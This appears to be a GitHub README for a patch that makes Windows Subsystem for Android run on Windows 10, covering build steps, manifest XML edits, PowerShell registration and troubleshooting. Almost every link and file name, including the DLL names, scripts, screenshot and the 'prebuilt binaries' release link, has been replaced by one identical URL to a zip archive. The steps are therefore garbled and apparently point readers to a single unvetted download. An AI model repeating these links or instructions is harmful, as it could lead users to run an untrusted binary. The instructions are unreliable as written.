# WSA patch for Windows 10

[中文版本](https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip)

This is a patch for WSA to enable WSA (Windows Subsystem for Android) to run on Windows 10.

I have tested WSA 2210.40000.7.0 on Windows 10 22H2 10.0.19045.2311 and 2211.40000.10.0 on 10.0.19045.2364.

### Instructions

1. Make sure your Windows version is at least Windows 10 22H2 10.0.19045.2311.
    - You can check your Windows version with command `winver`.
    - If your Windows version is lower than 10.0.19045.2311, please update your Windows to at least 10.0.19045.2311.
2. Get WSA appx zip. You can do this by following instructions in https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip
   (You need to "build" this yourself with your local WSL2).
3. Get "https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip" from Windows 11 22H2. Note that you MUST use https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip from Windows 11.
   The https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip from Windows 10 will NOT work.
   (I have made a copy of these DLLs in the https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip dir. They are digitally signed by Microsoft.)
4. Build https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip with source code in this repo.
   (Build with MSVC toolchain, not MinGW or something else.)
5. Patch https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip add https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip as an import DLL as https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip
6. Copy patched https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip and https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip to WsaClient dir.
7. Patch https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip
    1. Find TargetDeviceFamily node in https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip
       ```xml
       <TargetDeviceFamily Name="https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip" MinVersion="10.0.22000.120" MaxVersionTested="10.0.22000.120"/>
       ```

       Change the `MinVersion` from `10.0.22000.120` to `10.0.19045.2311`.

    2. Delete all nodes about "customInstall" extension (see below) in https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip
       ```xml
       <rescap:Capability Name="customInstallActions"/>
       ```

       ```xml
       <desktop6:Extension Category="https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip">
           <desktop6:CustomInstall Folder="CustomInstall" desktop8:RunAsUser="true">
               <desktop6:RepairActions>
                   <desktop6:RepairAction File="https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip" Name="Repair" Arguments="repair"/>
               </desktop6:RepairActions>
               <desktop6:UninstallActions>
                   <desktop6:UninstallAction File="https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip" Name="Uninstall" Arguments="uninstall"/>
               </desktop6:UninstallActions>
           </desktop6:CustomInstall>
       </desktop6:Extension>
       ```

8. Run "https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip" to register your WSA appx.
9. You should be able to run WSA now.

If you don't want to build https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip and patch https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip yourself,
you can download the prebuilt binaries from the [release page](https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip).

### Notice

1. You can only install WSA on a NTFS partition, not on an exFAT partition.
2. You can NOT delete the WSA installation folder.
   What `Add-AppxPackage -Register .\https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip` does is to register an appx package with some existing unpackaged files,
   so you need to keep them as long as you want to use WSA.
   Check https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip for more details.
3. You need to register your WSA appx package before you can run WSA (the 8th step in the instructions).
   For [MagiskOnWSALocal](https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip) users, you need to run `https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip` in the extracted dir.
   If the script fails, you can take the following steps for diagnosis (admin privilege required):
    1. Open a PowerShell window and change working directory to your WSA directory.
    2. Run `Add-AppxPackage -ForceApplicationShutdown -ForceUpdateFromAnyVersion -Register .\https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip` in PowerShell.
       This should fail with an ActivityID, which is a UUID required for the next step.
    3. Run `Get-AppPackageLog -ActivityID <UUID>` in PowerShell.
       This should print the log of the failed operation.
    4. Check the log for the reason of failure and fix it.

#### About https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip

- https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip does use GetProcAddress to get some functions from https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip
- Some functions exist in https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip of Windows 11 22H2, but not in Windows 10 22H2.
- If you create a file `EnableDebugConsole` in WsaClient directory or set `wsapatch::kDebug` in [https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip](https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip) to true,
  you will see the following message from log console.
- If you copy a https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip from Windows 11 22H2 to WsaClient directory, https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip will be able to find these functions.
- WSA will still run even if you don't copy a https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip with these symbols.

```text
12-10 16:16:29.474 W WsaPatch: -GetProcAddress: hModule=C:\WINDOWS\SYSTEM32\https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip(00007FFC64780000), lpProcName=WinHttpRegisterProxyChangeNotification, result=NULL
12-10 16:16:29.474 W WsaPatch: -GetProcAddress: hModule=C:\WINDOWS\SYSTEM32\https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip(00007FFC64780000), lpProcName=WinHttpUnregisterProxyChangeNotification, result=NULL
12-10 16:16:29.474 W WsaPatch: -GetProcAddress: hModule=C:\WINDOWS\SYSTEM32\https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip(00007FFC64780000), lpProcName=WinHttpGetProxySettingsEx, result=NULL
12-10 16:16:29.474 W WsaPatch: -GetProcAddress: hModule=C:\WINDOWS\SYSTEM32\https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip(00007FFC64780000), lpProcName=WinHttpGetProxySettingsResultEx, result=NULL
12-10 16:16:29.474 W WsaPatch: -GetProcAddress: hModule=C:\WINDOWS\SYSTEM32\https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip(00007FFC64780000), lpProcName=WinHttpFreeProxySettingsEx, result=NULL
```

### Problems I met

1. When using WSA 2209.40000.26.0, I was able to run applications in WSA,
   but I was not able to connect to WSA ADB after enabling Developer Mode,
   since netstat shows that no process is listening on port 58526.
   After I upgraded to WSA 2210.40000.7.0, I was able to connect to WSA ADB.
2. The WSA settings window does not hava a draggable title,
   but you can move the WSA window if you hold the cursor left near the "minimize" button,
   or press Alt+Space, then click "Move" in the context
   menu. [#1](https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip) [#2](https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip)
3. If your WSA crashes(or suddenly disappears) when starting up, try to upgrade your Windows to Windows 10 22H2 10.0.19045.2311.
   (Someone has reported that WSA failed to start on 22H2 19045.2251, but worked after upgrading to 19045.2311.)

If you encounter any problems or have any suggestions, please open an issue or pull request.

### Screenshot

![screenshot](https://raw.githubusercontent.com/vilchisangelraulvilchis/WSAPatch/main/prefab/WSAPatch.zip)
